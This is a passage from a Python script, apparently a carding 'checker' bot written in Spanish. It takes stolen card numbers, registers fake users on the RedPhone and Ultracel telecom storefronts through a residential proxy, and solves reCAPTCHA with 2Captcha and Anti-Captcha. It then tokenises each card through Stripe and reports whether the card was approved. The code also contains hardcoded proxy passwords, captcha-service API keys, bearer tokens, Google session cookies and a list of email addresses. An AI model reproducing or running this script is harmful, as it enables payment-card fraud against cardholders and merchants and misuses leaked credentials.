                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'payment_card[card_name]': name+last,
                'payment_card[card_number]': cc_number,
                'payment_card[cvv]': cvv,
                'payment_card[expiry_month]': mes,
                'payment_card[expiry_year]': ano_number,
                'payment_card[is_default]': 'false',
                'payment_card[stripe_token]': tokenst,
                'user_id': id_servicio,
            }

            response = requests.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, data=data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            #print(responsePm)
            

            mensaje = ""

            # Verificar si hay un error tipo 'card_declined'
            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                if error_info.get('code') == 'card_declined':
                    mensaje = f"❌ Tarjeta rechazada: {error_info.get('message', 'Error desconocido')}"
                else:
                    mensaje = f"⚠️ Otro error: {error_info.get('message', 'Error desconocido')}"

            # Verificar si está aprobado por status 'delivered' o 'authorized'
            elif 'altan_service_bundle_order' in responsePm:
                status = responsePm['altan_service_bundle_order'].get('status', '').lower()
                if status in ['delivered', 'authorized']:
                    mensaje = "✅ Aprobado"
                else:
                    mensaje = f"🔄 Estado: {status}"

            # Verificar si existe 'created_at' en payment_card
            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                fecha = responsePm['payment_card']['created_at']
                mensaje = f"✅ Aprobado (Tarjeta registrada correctamente)\n🕒 Fecha de creación: {fecha}"

            # En caso de que no sea ninguno de los anteriores
            else:
                mensaje = f"❓ Respuesta no reconocida: {responsePm}"
            
            print(mensaje)

            return mensaje


            

            
                                    
            


           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

async def red(card: str) -> str:    
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }
            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response =  c.get('https://redphone.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)
            

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI2YTkzYjYxNC1lYzE4LTRlMDYtOWY4ZC1kZjhhYTY2NjllOWIifQ.ztwNlAv-V8L0M6qHfB68Q_cXupibSQCFTEguIf6XxTo',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '24',
            }

            response = c.get('https://redphone.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': 'julie',
                    'last_name': 'villa',
                    'maiden_name': '',
                    'email': email,
                    'phone': None,
                    'mobile_phone': '9986363277',
                    'privacy_acceptance': True,
                },
            }


            response = c.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            id_servicio = responsePm['user']['id']
            print(id_servicio)
            

           

            API_KEY = "bf5a65205366ac960191fd60de67463d"
            SITE_KEY = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"
            URL_OBJETIVO = "https://ecommerce.redphone.com.mx/paso-3"

            api_key = "faa4893569844da8b6055901f34b8d2f"

            # Datos del sitio
            website_url = "https://ecommerce.redphone.com.mx/paso-3"
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear tarea en 2Captcha
            print("📤 Enviando captcha a 2Captcha...")

            payload = {
                'key': api_key,
                'method': 'userrecaptcha',
                'googlekey': sitekey,
                'pageurl': website_url,
                'json': 1
            }

            response = requests.post('http://2captcha.com/in.php', data=payload)
            task_result = response.json()

            if task_result['status'] != 1:
                print("❌ Error al enviar captcha:", task_result['request'])
                exit()

            captcha_id = task_result['request']
            print("🆔 Tarea creada. ID:", captcha_id)

            # Paso 2: Esperar la solución
            result_url = f"http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}&json=1"
            print("⏳ Esperando respuesta...")

            token = None
            for _ in range(20):
                time.sleep(5)
                result_response = requests.get(result_url)
                result_data = result_response.json()

                if result_data['status'] == 1:
                    token = result_data['request']
                    print("✅ CAPTCHA resuelto.")
                    break
                elif result_data['request'] == 'CAPCHA_NOT_READY':
                    print("⏳ Aún sin resolver, esperando...")
                else:
                    print("❌ Error:", result_data['request'])
                    break

            else:
                return("❌ Tiempo de espera agotado.")


            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-protobuffer',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; NID=524=Bjlha-sk9zOfyKYFQKjno-xfvBZXJ8vsIklFc_toQsQivbdhQTMIiBag-ZBU6OXtme1LHcVIIlN1iOdxRA3Otw5TVrVwMPrggCO2yRd0zQhXkyYVyxgJTR57lfaWbzR_5ZWHiXAhyfK60KZrU5O5ZIb24kIv3nZaROUXjb3Pyzl7ebpi5DbJx4ITdMUIjQ3I6NhZcbhIQ0Y4EGH5ikfX1bqpxYFls5p979Wzdy8iYU8rxP8o7GgQMPcqw40ZbQyKeAydcZVqSnyHVgIc4R7xPJ7Ke75U7PThkAHHxkZ0hFhPnkn1ZoUxKAv6j0d7n75vqfANsJPQyAoFbybBbuxGAfYtwgFNLwgvYY1VLuPdfazxh57c6g1XC4DGYaO-tc23SZ5rvxZKgNAR8ltkCaeKo1jn4GX5sg9kKca4ypJqfX31HvO-Yi3eRCBew5b1CbsvoJ7ZxC1kRTTYUy3s8CAmInCzyXFWOoSGzaWiXlRUwV9Q54_zku_1HxFcemntPALpQzBVMWlsBQXEt1KUlsKzrwzY1WSw8IVkn8SYk1rJUhfZ2IEuKTXMO6MdA4_5FAE9XokKXjMVGfK4TYTzUVwzq_c_F1Xr1KNWpbEz1rK0HO3n0_JCcRBaas4gecWDE2oLr5tdloh8Bl9ovujSNTEDpjZGzKjZbm6-SUyPzJpDZIgANafNfh6VtSwE16T1V1B0I3Ka-h8H-sw0GNWsrqHzA-Jp35tEiZdP-BpfSuW6rXrMLS189twi2Pt5qFZWJ1Lmk83FnrctLjTNf8quGlvoZg2FhI2w6SIV18T29I5gNnYUW2x6q7UlYtMFf2mS-4Uk1JI8FfQFcZhcydVjpwoz8z9yYJhi66Xhw0e6UzODedo0UjvRrlkVI7DZAbfi197ruUKfxJQr6jwGsELbaWVpROhd7FE2iZmI_ufkhNJC_0bfPl1bweUCilvQD18jHoXbn02Qy02FdEijD25KjAoQqt8PjAzKzEsGum5pTyRYJO8FJc6vkn0AbE7qFj08tt_tkKAYPn7NcmAzAJb1wvDSxasuiTPPXm4KZpgy2c4cYWPXYjmpgtFRb7G_FPB_fDQcuf48SvC4rtGg9ZA9wDbR_h73p9xQTOAom0ZDLhul5ySvf-RrydZyjdp5fc9yytWWu8ZjHrWxlyzZd-LGV4V8NMyilWxW-pxKeqR8-OiQWz8pDb2JmLz85bwZTzk_WNF2UI8rNFtg_ysXNGYTZevOAeFQmlxvvUKpWPE1A5EB5zue2ySKNM-tzssFKnj7EW1Z-u6aOL_KjFzJ5tC8FSgwTXTCKO69Muh4J6ksrq7fUaxQIYNUcAO1DgLNnYNi1uEM2ttp9t53MizmJo4do8iayOZOKmUcMokG64IHIIvdmNhR1cdHvcLQ7YY01NIwSAudsieHwUW-xmmm69KSqGqWjwGi7s9Nv8xxud6t3A; __Secure-3PSIDTS=sidts-CjIB5H03P9FbtGATpvevBoYjOer4Nwuh7gM16VOOPIGcN4eVIA-ciUzANjEIrq4vNE0aBRAA; __Secure-3PSIDCC=AKEyXzVNjKl4-4tE-yh4SZf4KjpxMAezobvXYkTI1ZlYmYJaFbrYc3mhcjKb-w1ZZexPnhtv4c0',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwpBsxsF3eY665Ye&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = b'\n\x18GUGrl5YkSwqiWrzO3ShIKDlu\x12\xc3\xa4\x0b' + token.encode('utf-8')

            response = c.post('https://www.google.com/recaptcha/api2/reload', params=params, headers=headers, data=data)

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; NID=524=Bjlha-sk9zOfyKYFQKjno-xfvBZXJ8vsIklFc_toQsQivbdhQTMIiBag-ZBU6OXtme1LHcVIIlN1iOdxRA3Otw5TVrVwMPrggCO2yRd0zQhXkyYVyxgJTR57lfaWbzR_5ZWHiXAhyfK60KZrU5O5ZIb24kIv3nZaROUXjb3Pyzl7ebpi5DbJx4ITdMUIjQ3I6NhZcbhIQ0Y4EGH5ikfX1bqpxYFls5p979Wzdy8iYU8rxP8o7GgQMPcqw40ZbQyKeAydcZVqSnyHVgIc4R7xPJ7Ke75U7PThkAHHxkZ0hFhPnkn1ZoUxKAv6j0d7n75vqfANsJPQyAoFbybBbuxGAfYtwgFNLwgvYY1VLuPdfazxh57c6g1XC4DGYaO-tc23SZ5rvxZKgNAR8ltkCaeKo1jn4GX5sg9kKca4ypJqfX31HvO-Yi3eRCBew5b1CbsvoJ7ZxC1kRTTYUy3s8CAmInCzyXFWOoSGzaWiXlRUwV9Q54_zku_1HxFcemntPALpQzBVMWlsBQXEt1KUlsKzrwzY1WSw8IVkn8SYk1rJUhfZ2IEuKTXMO6MdA4_5FAE9XokKXjMVGfK4TYTzUVwzq_c_F1Xr1KNWpbEz1rK0HO3n0_JCcRBaas4gecWDE2oLr5tdloh8Bl9ovujSNTEDpjZGzKjZbm6-SUyPzJpDZIgANafNfh6VtSwE16T1V1B0I3Ka-h8H-sw0GNWsrqHzA-Jp35tEiZdP-BpfSuW6rXrMLS189twi2Pt5qFZWJ1Lmk83FnrctLjTNf8quGlvoZg2FhI2w6SIV18T29I5gNnYUW2x6q7UlYtMFf2mS-4Uk1JI8FfQFcZhcydVjpwoz8z9yYJhi66Xhw0e6UzODedo0UjvRrlkVI7DZAbfi197ruUKfxJQr6jwGsELbaWVpROhd7FE2iZmI_ufkhNJC_0bfPl1bweUCilvQD18jHoXbn02Qy02FdEijD25KjAoQqt8PjAzKzEsGum5pTyRYJO8FJc6vkn0AbE7qFj08tt_tkKAYPn7NcmAzAJb1wvDSxasuiTPPXm4KZpgy2c4cYWPXYjmpgtFRb7G_FPB_fDQcuf48SvC4rtGg9ZA9wDbR_h73p9xQTOAom0ZDLhul5ySvf-RrydZyjdp5fc9yytWWu8ZjHrWxlyzZd-LGV4V8NMyilWxW-pxKeqR8-OiQWz8pDb2JmLz85bwZTzk_WNF2UI8rNFtg_ysXNGYTZevOAeFQmlxvvUKpWPE1A5EB5zue2ySKNM-tzssFKnj7EW1Z-u6aOL_KjFzJ5tC8FSgwTXTCKO69Muh4J6ksrq7fUaxQIYNUcAO1DgLNnYNi1uEM2ttp9t53MizmJo4do8iayOZOKmUcMokG64IHIIvdmNhR1cdHvcLQ7YY01NIwSAudsieHwUW-xmmm69KSqGqWjwGi7s9Nv8xxud6t3A; __Secure-3PSIDTS=sidts-CjIB5H03P9FbtGATpvevBoYjOer4Nwuh7gM16VOOPIGcN4eVIA-ciUzANjEIrq4vNE0aBRAA; __Secure-3PSIDCC=AKEyXzXbiG2HGGsZq36fEp7D7EQ_yfCQyn4--NK_Tjgd51F3VHp6X-gtcrvLHMnyf3Qdk5DokAc',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwpBsxsF3eY665Ye&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = f'v=GUGrl5YkSwpBsxsF3eY665Ye&c={token}'
 
            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
                headers=headers,
                data=data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=19320&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=830cfac5-04bc-45bf-b039-3d4790e48dfa5b7899&sid=66066ccb-0350-46f6-9b05-4b10333d40fac9bfbf&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            if "id" in responsePm:
                tokenst = responsePm["id"]
                print(tokenst)
            else:
                return "❌ Usa otra tarjeta o comando"

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': None,
                    'openpay_device_session_id': 'XnW6OQ5H4436jIR14GCUgoj0XjtvVId2',
                    'stripe_token': tokenst,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': id_servicio,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)
            print(response.text)
            data = json.loads(response.text) 
            print(responsePm)
            try:
                # Si es un error (Stripe - tarjeta declinada u otro)
                if 'message' in data and 'error' in data['message']:
                    error_info = data['message']['error']
                    decline_code = error_info.get('decline_code', 'desconocido')
                    message = error_info.get('message', 'Error desconocido')
                    return (
                        f"❌ 𝑻𝒂𝒓𝒋𝒆𝒕𝒂 𝑫𝒆𝒄𝒍𝒊𝒏𝒂𝒅𝒂\n"
                        f"Motivo: {message}\n"
                        f"Decline Code: {decline_code}"
                    )

                # Si es una respuesta de compra exitosa
                elif 'altan_service_bundle_order' in data:
                    orden = data['altan_service_bundle_order']
                    status = orden.get('status')
                    if status == 'delivered':
                        return (
                            f"✅ 𝑪𝒐𝒎𝒑𝒓𝒂 𝑨𝒑𝒓𝒐𝒃𝒂𝒅𝒂\n"
                            f"Estado: {status}"
                        )
                    else:
                        return (
                            f"✅ 𝑪𝒐𝒎𝒑𝒓𝒂 𝑨𝒑𝒓𝒐𝒃𝒂𝒅𝒂\n"
                            f"Estado: {status}"
                        )

                # Caso desconocido
                return (
                    "❓ Respuesta desconocida\n"
                    "No se pudo interpretar el resultado de la operación."
                )

            except Exception as e:
                return (
                    "⚠️ Error al procesar\n"
                    f"Detalles: {str(e)}"
                )


                        

            
                                    
            


           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    


async def ultra(card: str) -> str:    
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            correos = [
                "marilisaqnituk@gmail.com",
                "flortsquitk@gmail.com",
                "quitukferchag@gmail.com",
                "saramanquitk@gmail.com",
                "jorgaioquint@gmail.com",
                "rodrigoking234@gmail.com",
                "rodrigoquituk004@gmail.com",
                "armeida.cate771@gmail.com",
                "viquitukeliander@gmail.com",
                "quityksantome@gmail.com",
                "samanquitguajal@gmail.com",
                "quintkdelgelo@gmail.com",
                "squitukjomilu@gmail.com",
                "lauranquinyuk@gmail.com",
                "rodrigoqgomez@gmail.com",
                "gardunoerick2@gmail.com"
            ]

            correo_seleccionado = random.choice(correos)
            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response = c.get('https://ultravision.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)
            

            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI3NDVlOTk5ZS1lNWY4LTQxMmMtYTNhYS1jNzZkMzZmNmEwMjAifQ.hbskLok4zoK-KUN64liDaNoWyEHx1eCMokI67UIWifc',
                'cache-control': 'no-cache',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '75',
            }

            response = c.get('https://ultravision.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            
            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': correo_seleccionado,
                    'phone': None,
                    'mobile_phone': '9971556986',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://ultravision.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            id_servicio = responsePm['user']['id']
            print(id_servicio)
            

            API_KEY = "0d8e41b1e594461a0a6c6b7b018f655e"  # 🔴 Reemplázala con tu clave de Anti-Captcha
            SITE_KEY = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"  # 🔹 Sitekey de reCAPTCHA
            URL_OBJETIVO = "https://tienda.ultracel.com.mx/paso-3"  # 🔹 Página con el reCAPTCHA

            task_id = None

            # Paso 1: Crear la tarea (loop hasta que se logre)
            while task_id is None:
                try:
                    response = requests.post("https://api.anti-captcha.com/createTask", json={
                        "clientKey": API_KEY,
                        "task": {
                            "type": "RecaptchaV2TaskProxyless",
                            "websiteURL": URL_OBJETIVO,
                            "websiteKey": SITE_KEY
                        }
                    })
                    result = response.json()
                    if result.get("errorId") == 0:
                        task_id = result["taskId"]
                        print(f"✅ Captcha enviado. ID: {task_id}")
                    else:
                        print(f"❌ Error en createTask: {result.get('errorDescription')}, reintentando...")
                except Exception as e:
                    print(f"❌ Excepción en createTask: {e}, reintentando...")
                time.sleep(3)  # Espera antes de intentar otra vez

            # Paso 2: Obtener el resultado del captcha (loop hasta que esté listo)
            token_captcha = None
            while token_captcha is None:
                try:
                    response = requests.post("https://api.anti-captcha.com/getTaskResult", json={
                        "clientKey": API_KEY,
                        "taskId": task_id
                    })
                    resultado = response.json()

                    if resultado.get("status") == "ready":
                        token_captcha = resultado["solution"]["gRecaptchaResponse"]
                        print("✅ Captcha resuelto con éxito.")
                    else:
                        print("⏳ Aún no resuelto. Reintentando en 5 segundos...")
                except Exception as e:
                    print(f"❌ Error al obtener resultado: {e}, reintentando...")

                if token_captcha is None:
                    time.sleep(5)
            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSIDTS=sidts-CjIB5H03P9FbtGATpvevBoYjOer4Nwuh7gM16VOOPIGcN4eVIA-ciUzANjEIrq4vNE0aBRAA; 